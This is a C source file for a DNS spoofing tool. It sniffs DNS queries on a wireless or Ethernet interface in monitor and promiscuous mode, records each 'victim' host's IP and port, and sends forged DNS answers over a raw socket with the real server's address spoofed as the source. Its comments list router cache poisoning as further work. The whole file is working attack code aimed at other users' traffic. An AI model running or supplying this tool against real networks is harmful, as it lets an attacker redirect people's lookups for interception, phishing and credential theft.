/*

DONE :

v Creating a handle in monitor mode for packet interception
v Filtering the DNS packets -> Sniffing.../
v Creating a data structure with the IP and port of the victim PC, 
v Crafting the DNS response -> DNS/
v Sending (in a multithreaded way) our DNS response via raw socket -> Raw.../

Extra :

 * Poisonning the cache of the routeur
 * More protection against buffer overflow

 */

#include<pcap.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include <pthread.h>

#include<sys/socket.h>
#include<arpa/inet.h>

#include "header.h"
#include "dns.h"
#include "dns_pois.h"

//some global counter
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j, header_type;

#define CHOSEN_INTERFACE "en1"


int main(int argc, char *argv[])
{
    pcap_t *handle;

    char err_buf[PCAP_ERRBUF_SIZE];
    char dev_name[] = CHOSEN_INTERFACE;
    bpf_u_int32 net_ip, mask;

    int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
    {
        fprintf(stderr, "Error looking up net: %s \n", dev_name);
        exit(1);
    }

    struct sockaddr_in addr;
    addr.sin_addr.s_addr = net_ip;
    char ip_char[100];
    inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
    printf("NET address: %s\n", ip_char);

    addr.sin_addr.s_addr = mask;
    memset(ip_char, 0, 100);
    inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
    printf("Mask: %s\n", ip_char);

    if (!(handle = pcap_create(dev_name, err_buf))){
        fprintf(stderr, "Pcap create error : %s", err_buf);
        exit(1);
    }

    pcap_set_timeout(handle, 1000); // Timeout in milliseconds 

    if (pcap_can_set_rfmon(handle)==1){
        if (pcap_set_rfmon(handle, 1))
            pcap_perror(handle,"Error while setting monitor mode");
    }
    else{
        printf("Monitor mode not available\n");
    }

    if(pcap_set_promisc(handle,1)) //also promiscuous mode
        pcap_perror(handle,"Error while setting promiscuous mode");

    //Setting timeout for processing packets to 1 ms
    if (pcap_set_timeout(handle, 1))
        pcap_perror(handle,"Pcap set timeout error");

    //Activating the sniffing handle
    if (pcap_activate(handle))
        pcap_perror(handle,"Pcap activate error");

    char filter_name[] = "udp && port 53";

    struct bpf_program filter;

    if(pcap_compile(handle,&filter,filter_name,1,mask) < 0){
        printf("Filter compilation Error\n");
        exit(1);
    }

    if(pcap_setfilter(handle,&filter) < 0){
        printf("Filter installation error\n");
        exit(1);
    }

    header_type = pcap_datalink(handle);
    printf("Device %s is opened. Begin sniffing...\n", dev_name);

    //printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\n", tcp , udp , icmp , igmp , others , total);

    logfile=fopen("log.txt","w");
    if(logfile==NULL)
    {
        printf("Unable to create file.");
    }

    //Put the device in sniff loop
    pcap_loop(handle , -1 , process_packet , NULL);

    pcap_close(handle);

    //for testing purposes only

    /*
       sending_args *msg = malloc(sizeof(sending_args));
       memset(msg, 0, sizeof(sending_args));
       msg->source_ip = malloc(20*sizeof(char));
       memset(msg->source_ip, 0, 20*sizeof(char));

       msg->sockinfo.sin_family = AF_INET;
       msg->sockinfo.sin_port = htons(1234);
       msg->sockinfo.sin_addr.s_addr = inet_addr("127.0.0.1");

       msg->source_ip = "123.123.123.123";
       msg->source_port = 53;

       sendDNS(msg);*/

    return 0;

}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
    //Get the IP Header part of this packet , excluding the ethernet header
    int header_size;

    if (header_type == LINKTYPE_WIFI){

        uint16_t radio_len = (*(uint16_t *)(buffer + 2));
        //printf("Radio length : %d\n", radio_len);

        if((*(buffer + radio_len + 1) & 0x08) == 0x08) { printf("Retransmission. Dropping \n"); return;}

        header_size = radio_len + 24 + 8;

    } 
    else if (header_type == LINKTYPE_ETH) header_size = sizeof(struct ethhdr);
    else { printf("Packet not recognized \n"); return; }

    struct iphdr *iph = (struct iphdr*)(buffer + header_size); //pointer to start of ip header

    unsigned short iphdrlen = iph->ihl*4;

    header_size += iphdrlen;

    struct udphdr *udph = (struct udphdr*)(buffer + header_size); //pointer to start of UDP header

    header_size += sizeof udph;

    sending_args *msg = malloc(sizeof(sending_args));
    msg->source_ip = malloc(20*sizeof(char));

    msg->buf = (uint8_t *)(buffer + header_size);

    msg->sockinfo.sin_family = AF_INET;
    msg->sockinfo.sin_port = udph->source;
    msg->sockinfo.sin_addr.s_addr = iph->saddr;

    inet_ntop(AF_INET, &iph->daddr, msg->source_ip, 20);
    msg->source_port = ntohs(udph->dest);

    /*pthread_t thread;
      if( pthread_create(&thread, NULL, sendDNS, msg) < 0){
      printf("Error creating thread\n");
      }*/

    //Parallelism slows down too much on my computer to answer before real DNS server

    sendDNS(msg);

    //printf("TCP : %d   UDP : %d   ICMP : %d   IGMP : %d   Others : %d   Total : %d\r", tcp , udp , icmp , igmp , others , total);

}
void sendDNS(void * args)
{
    sending_args *info = (sending_args *)args;

    if(((dns_header *) info->buf)->qr == 1) {printf("DNS Response. Dropping\n"); return;} //slows down process.

    if(ntohs(((struct dns_header *)(info->buf))->qd_count) != 1 || ntohs(((struct dns_header *)(info->buf))->an_count) != 0) { printf("Not DNS. Exiting\n"); return;}

    ++total;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(fd < 0)
    {
        perror("Error creating raw socket at first try ");
        exit(1);
    }

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    struct sockaddr_in *sin = &info->sockinfo;

    if(fd < 0)
    {
        perror("Error creating raw socket ");
        exit(1);
    }

    uint8_t packet[65536], *data;

    //memset(packet, 0, 65536);

    //IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;

    //UDP header pointer
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_udp_header psh;

    //data section pointer
    data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    //strcpy((char *)data, "Test");
    //uint8_t msg_size = strlen((char *)data);
    uint8_t *dns = (uint8_t *)data;
    uint8_t *buf = (uint8_t *)info->buf;
    int msg_size = sizeof(uint8_t) * build_dns_answer(dns,buf);

    //fill the IP header here

    iph->ihl = 5;
    iph->version = 4;

    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + msg_size;
    iph->id = htons(9999);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 17;

    inet_pton(AF_INET, info->source_ip, &(iph->saddr));
    iph->daddr = sin->sin_addr.s_addr;

    //fill the Pseudo UDP Header

    inet_pton(AF_INET, info->source_ip, &(psh.source_address));
    psh.dest_address = sin->sin_addr.s_addr;
    psh.protocol = 17;
    psh.udp_length = htons(sizeof(struct udphdr) + msg_size);

    //fill the UDP header

    udph->len = htons(sizeof(struct udphdr)+msg_size);
    udph->source = htons(info->source_port);
    udph->dest = sin->sin_port;
    udph->check = 0;

    //Checksum

    register long sum;
    unsigned short oddbyte;

    int nbytes = sizeof(struct pseudo_udp_header);
    unsigned short *ptr = (u_int16_t *) &psh;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }

    nbytes = sizeof(struct udphdr) + msg_size;
    ptr = (u_int16_t *) udph;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    udph->check = (short)~sum;

    /*
       uint8_t *checksumcalc = malloc(sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + msg_size);

       memcpy(checksumcalc, (uint8_t *) &psh, sizeof(struct pseudo_udp_header));
       memcpy(checksumcalc + sizeof(struct pseudo_udp_header), (uint8_t *) udph, sizeof(struct udphdr) + msg_size);

       udph->check = checksum((u_int16_t *) checksumcalc, sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + msg_size);*/

    iph->check = checksum((u_int16_t *)packet, iph->tot_len);

    /*for(int i = 0; i < iph->tot_len; i++){
      printf("%x ",packet[i]);
      }*/

    //send the packet

    if (sendto (fd, packet, iph->tot_len ,  0, (struct sockaddr *) sin, sizeof(struct sockaddr)) < 0)
    {
        perror("sendto failed");
    }
    else
    {
        printf ("DNS packet sent, length : %d \n" , iph->tot_len);
    }

    printf("\n\n##########  Packet Received  ##########\n\n");

    printf("Sending the following packet : \nSource IP : %s\n",info->source_ip);
    printf("Source port : %d\n",info->source_port);
    printf("Dest IP : %s\n", inet_ntoa(info->sockinfo.sin_addr));
    printf("Dest Port : %d\n",htons(info->sockinfo.sin_port));

    printf("\n\n##########  Packet Sent ##########\n\n");

    free(info->source_ip);
    close(fd);
    free(info);
}
